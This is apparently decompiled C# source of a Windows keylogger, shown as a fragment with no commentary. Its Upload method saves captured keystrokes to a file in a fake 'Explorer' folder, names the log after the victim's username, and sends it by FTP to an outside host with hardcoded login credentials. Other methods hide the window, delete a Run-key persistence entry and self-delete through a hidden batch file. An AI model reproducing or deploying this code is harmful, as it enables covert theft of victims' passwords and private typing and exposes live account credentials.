					IL_01b2:
					num = 38;
					interval = checked(num5 * 60000);
					goto IL_01bf;
					IL_01bf:
					num = 39;
					Timer2.set_Interval(interval);
					goto IL_01d0;
					IL_01d0:
					num = 40;
					((Form)this).set_WindowState((FormWindowState)1);
					goto IL_01db;
					IL_01db:
					num = 41;
					AnimateWindow(ToTray: true);
					goto IL_01e6;
					IL_01e6:
					num = 42;
					Timer1.Start();
					goto IL_01f5;
					IL_01f5:
					num = 43;
					Timer2.Start();
					goto IL_0204;
					end_IL_0000_2:
					break;
				}
				num = 45;
				MessageBox.Show("Done!", "Startup Error!!!", (MessageBoxButtons)0, (MessageBoxIcon)16, (MessageBoxDefaultButton)0);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 761;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Upload()
	{
		try
		{
			string text = null;
			text = Environment.GetEnvironmentVariable("ProgramFiles") + "\\Explorer\\";
			string text2 = text + "keys.txt";
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text2, KeyLog, true);
			FileInfo fileInfo = new FileInfo(text2);
			string text3 = null;
			text3 = Environment.GetEnvironmentVariable("USERNAME");
			string text4 = DateAndTime.get_Now().Day.ToString();
			if (text4.Length == 1)
			{
				text4 = text4.Replace(text4, "0" + text4);
			}
			string text5 = DateAndTime.get_Now().Month.ToString();
			if (text5.Length == 1)
			{
				text5 = text5.Replace(text5, "0" + text5);
			}
			string text6 = DateAndTime.get_Now().Hour.ToString();
			if (text6.Length == 1)
			{
				text6 = text6.Replace(text6, "0" + text6);
			}
			string text7 = DateAndTime.get_Now().Minute.ToString();
			if (text7.Length == 1)
			{
				text7 = text7.Replace(text7, "0" + text7);
			}
			string text8 = text4 + text5 + "." + text6 + text7;
			string text9 = null;
			text9 = "ftp://ftp.0fees.net//htdocs/keylog//" + text8 + "(" + text3 + ")logs.txt";
			if (fileInfo.Length > 10240L)
			{
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(text9);
				ftpWebRequest.Credentials = new NetworkCredential("fees0_2928537", "adamadam1");
				ftpWebRequest.Method = "STOR";
				byte[] array = File.ReadAllBytes(text2);
				Stream requestStream = ftpWebRequest.GetRequestStream();
				requestStream.Write(array, 0, array.Length);
				requestStream.Close();
				requestStream.Dispose();
				KeyLog = null;
				File.Delete(text2);
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text2, KeyLog, false);
				((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text2).Attributes |= FileAttributes.Hidden;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void deleteall_Click(object sender, EventArgs e)
	{
		deletealls();
		selfdestruct();
	}

	private void deletealls()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RegistryKey registryKey = default(RegistryKey);
		string text = default(string);
		string path = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 196:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_000d;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_0034;
						case 6:
							goto IL_003f;
						case 7:
						case 8:
							goto IL_0048;
						case 9:
							goto IL_005c;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 11:
						case 12:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_005c:
					num = 9;
					if (registryKey.GetValue("Explorer") == null)
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0008:
					num = 2;
					text = null;
					goto IL_000d;
					IL_000d:
					num = 3;
					text = Environment.GetEnvironmentVariable("ProgramFiles") + "\\Explorer\\";
					goto IL_0025;
					IL_0025:
					num = 4;
					path = text + "keys.txt";
					goto IL_0034;
					IL_0034:
					num = 5;
					if (File.Exists(path))
					{
						goto IL_003f;
					}
					goto IL_0048;
					IL_003f:
					num = 6;
					File.Delete(path);
					goto IL_0048;
					IL_0048:
					num = 8;
					registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
					goto IL_005c;
					end_IL_0000_2:
					break;
				}
				num = 10;
				registryKey.DeleteValue("Explorer", throwOnMissingValue: true);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 196;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void selfdestruct()
	{
		string text = Path.GetTempPath();
		if (!text.EndsWith("\\"))
		{
			text += "\\";
		}
		string text2 = "_uninsep.bat";
		string text3 = text + text2;
		string executablePath = Application.get_ExecutablePath();
		string text4 = ":Repeat\r\nATTRIB -H \"{executable}\"\r\ndel \"{executable}\"\r\nif exist \"{executable}\" goto Repeat\r\ndel \"{batFileFullPath}\"\r\n";
		text4 = text4.Replace("{executable}", executablePath);
		text4 = text4.Replace("{batFileFullPath}", text3);
		StreamWriter streamWriter = new StreamWriter(text3, append: false);
		streamWriter.Write(text4);
		streamWriter.Close();
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = text3;
		process.Start();
		Application.Exit();
	}
}
